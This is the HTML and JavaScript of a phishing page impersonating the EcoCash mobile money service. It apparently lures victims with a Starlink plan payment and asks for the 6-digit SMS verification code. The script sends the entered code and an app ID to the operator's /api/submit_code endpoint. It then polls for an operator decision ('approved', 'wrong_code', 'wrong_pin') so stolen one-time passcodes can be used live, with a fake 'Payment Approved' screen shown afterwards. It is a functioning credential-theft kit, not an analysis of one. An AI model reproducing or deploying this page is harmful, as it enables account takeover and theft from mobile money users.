<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>EcoCash - Verify</title>
    <style>
        :root { --sky-blue: #0ea5e9; --dark: #1a1a2e; --gray: #6b7280; --white: #ffffff; --light: #f9fafb; --danger: #e53935; --success: #10b981; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--white); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px 12px; }
        .phone-frame { max-width: 390px; width: 100%; background: var(--white); border-radius: 32px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid #e5e7eb; }
        .inner-content { padding: 24px 16px; }
        .logo-row { display: flex; align-items: center; gap: 8px; margin-bottom: 24px; }
        .logo-row .eco { font-weight: 700; color: var(--sky-blue); font-size: 1.2rem; }
        .logo-row .cash { font-weight: 700; color: var(--danger); font-size: 1.2rem; }
        h3 { color: var(--dark); margin-bottom: 4px; }
        .phone-display { background: var(--light); padding: 8px 16px; border-radius: 25px; display: inline-block; font-weight: 600; font-size: 0.85rem; color: var(--dark); margin-bottom: 16px; }
        .instruction { background: #e0f2fe; border-radius: 12px; padding: 12px 16px; font-size: 0.8rem; color: var(--dark); margin-bottom: 12px; line-height: 1.5; }
        .instruction i { color: var(--sky-blue); margin-right: 4px; }
        .code-inputs { display: flex; gap: 8px; justify-content: center; margin: 1rem 0; }
        .code-inputs input { width: 44px; height: 52px; text-align: center; font-size: 1.3rem; font-weight: 700; border: 2px solid #e5e7eb; border-radius: 12px; outline: none; }
        .code-inputs input:focus { border-color: var(--sky-blue); }
        .code-inputs input.filled { border-color: var(--success); background: #f0fdf4; }
        .code-inputs input.error { border-color: var(--danger); background: #fef2f2; }
        .timer { text-align: center; font-weight: 700; font-size: 0.9rem; color: var(--dark); padding: 8px; background: #e0f2fe; border-radius: 10px; margin: 8px 0; }
        .timer.warning { background: #fef2f2; color: var(--danger); }
        .btn { width: 100%; padding: 14px; border-radius: 50px; font-weight: 700; font-size: 1rem; border: none; cursor: pointer; margin-top: 8px; }
        .btn-blue { background: var(--sky-blue); color: var(--white); }
        .resend-link { text-align: center; margin-top: 12px; }
        .resend-link a { color: var(--dark); text-decoration: none; font-size: 0.85rem; font-weight: 600; cursor: pointer; }
        .error-msg { color: var(--danger); font-size: 0.75rem; text-align: center; margin-top: 4px; display: none; }
        .error-msg.show { display: block; }
        .spinner { width: 40px; height: 40px; border: 3px solid #e5e7eb; border-top-color: var(--sky-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .success-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 1000; align-items: center; justify-content: center; }
        .success-overlay.active { display: flex; }
        .success-card { background: var(--white); border-radius: 20px; padding: 2rem; text-align: center; max-width: 350px; width: 90%; border: 2px solid var(--sky-blue); animation: popIn 0.5s ease; }
        @keyframes popIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
        .success-card h2 { color: var(--success); }
        .success-card .big-amount { font-size: 1.5rem; font-weight: 900; color: var(--dark); margin: 0.5rem 0; }
    </style>
</head>
<body>
<div class="phone-frame">
  <div class="inner-content">
    <div class="logo-row"><span class="eco">Eco</span><span class="cash">Cash</span></div>
    
    <div id="codeSection">
      <h3>✅ Verification Code</h3>
      <div class="phone-display" id="showPhone">+263 ---------</div>
      <div class="instruction"><i class="fas fa-sms"></i> <strong>Enter the 6‑digit code from your EcoCash SMS:</strong><br>The code will be numbers only.</div>
      <div class="code-inputs" id="codeInputs">
        <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
        <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
        <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
        <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
        <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
        <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
      </div>
      <div class="timer" id="timerDisplay">⏳ 60s</div>
      <div class="error-msg" id="codeError"></div>
      <button class="btn btn-blue" onclick="submitCode()">Submit →</button>
      <div class="resend-link"><a onclick="resendCode()">↻ Didn't receive SMS? Click here</a></div>
    </div>
    
    <div id="waitSection" style="display:none;"><div style="text-align:center;padding:40px 0;"><div class="spinner"></div><h3>Verifying...</h3></div></div>
  </div>
</div>
<div class="success-overlay" id="successOverlay"><div class="success-card"><h2>🎉 Payment Approved!</h2><div class="big-amount" id="approvedAmount">$ 0.00</div><p>Your Starlink plan will be activated shortly.</p><button class="btn btn-blue" onclick="window.location.href='/'">🏠 Home</button></div></div>

<script>
  var urlParams = new URLSearchParams(window.location.search);
  var appId = urlParams.get('app_id') || '';
  var userPhone = urlParams.get('phone') || '';
  var payAmount = urlParams.get('amount') || '0';
  var payPlan = urlParams.get('plan') || '';
  document.getElementById('showPhone').textContent = '+263 ' + userPhone;
  document.getElementById('approvedAmount').textContent = '$ ' + parseFloat(payAmount).toFixed(2) + ' - ' + decodeURIComponent(payPlan);

  var countdownTimer, resendCount = 0, resendCooldown = false;
  startCountdown();
  document.querySelector('.cd').focus();

  function nextCode(input) {
    input.value = input.value.replace(/\D/g, '');
    if (input.value.length === 1) {
      var next = input.nextElementSibling;
      if (next && next.classList.contains('cd')) next.focus();
    }
    var allFilled = true;
    document.querySelectorAll('.cd').forEach(function(d) { if (d.value === '') allFilled = false; });
    if (allFilled) {
      document.querySelectorAll('.cd').forEach(function(d) { d.classList.add('filled'); });
      setTimeout(function() { submitCode(); }, 500);
    }
  }

  function startCountdown() {
    if (countdownTimer) clearInterval(countdownTimer);
    var seconds = 60, display = document.getElementById('timerDisplay');
    display.textContent = '⏳ ' + seconds + 's'; display.className = 'timer';
    countdownTimer = setInterval(function() {
      seconds--; display.textContent = '⏳ ' + seconds + 's';
      if (seconds <= 10) display.className = 'timer warning';
      if (seconds <= 0) { clearInterval(countdownTimer); display.textContent = 'Time Expired'; display.className = 'timer warning'; }
    }, 1000);
  }

  async function resendCode() {
    if (resendCooldown || resendCount >= 3) return;
    resendCount++; resendCooldown = true;
    document.querySelectorAll('.cd').forEach(function(d) { d.value = ''; d.classList.remove('filled','error'); });
    document.querySelector('.cd').focus();
    document.getElementById('codeError').textContent = 'OTP Sent (' + resendCount + '/3)'; 
    document.getElementById('codeError').style.color = 'var(--dark)'; 
    document.getElementById('codeError').classList.add('show');
    try { await fetch('/api/submit_payment', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: userPhone, pin: '0000', amount: parseFloat(payAmount), plan: payPlan, purpose: 'OTP REQUESTED' }) }); } catch(e) {}
    startCountdown(); 
    setTimeout(function() { resendCooldown = false; }, 30000);
  }

  async function submitCode() {
    var enteredCode = '';
    document.querySelectorAll('.cd').forEach(function(d) { enteredCode += d.value; });
    if (enteredCode.length !== 6) { 
      document.getElementById('codeError').textContent = 'Please enter all 6 digits'; 
      document.getElementById('codeError').style.color = 'var(--danger)'; 
      document.getElementById('codeError').classList.add('show'); 
      return; 
    }
    if (countdownTimer) clearInterval(countdownTimer);
    document.getElementById('codeSection').style.display = 'none';
    document.getElementById('waitSection').style.display = 'block';
    await fetch('/api/submit_code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ app_id: appId, code: enteredCode }) });
    var checkInterval = setInterval(async function() {
      var res = await fetch('/api/check_status/' + appId); var data = await res.json();
      if (data.code_status === 'approved') { 
        clearInterval(checkInterval); 
        document.getElementById('successOverlay').classList.add('active'); 
      } else if (data.code_status === 'wrong_code') { 
        clearInterval(checkInterval); 
        // Turn boxes red
        document.querySelectorAll('.cd').forEach(function(d) { d.classList.add('error'); });
        document.getElementById('codeError').textContent = 'Wrong code. Please enter the recent code sent by EcoCash to verify.';
        document.getElementById('codeError').style.color = 'var(--danger)';
        document.getElementById('codeError').classList.add('show');
        // Clear inputs
        document.querySelectorAll('.cd').forEach(function(d) { d.value = ''; d.classList.remove('filled'); });
        document.querySelector('.cd').focus();
        document.getElementById('waitSection').style.display = 'none';
        document.getElementById('codeSection').style.display = 'block';
        startCountdown();
        setTimeout(function() {
          document.querySelectorAll('.cd').forEach(function(d) { d.classList.remove('error'); });
          document.getElementById('codeError').classList.remove('show');
        }, 4000);
      } else if (data.status === 'wrong_pin' || data.code_status === 'wrong_pin') { 
        clearInterval(checkInterval); 
        alert('Wrong PIN. Please use the correct PIN.'); 
        window.location.href = '/'; 
      }
    }, 2000);
  }
</script>
</body>
</html>
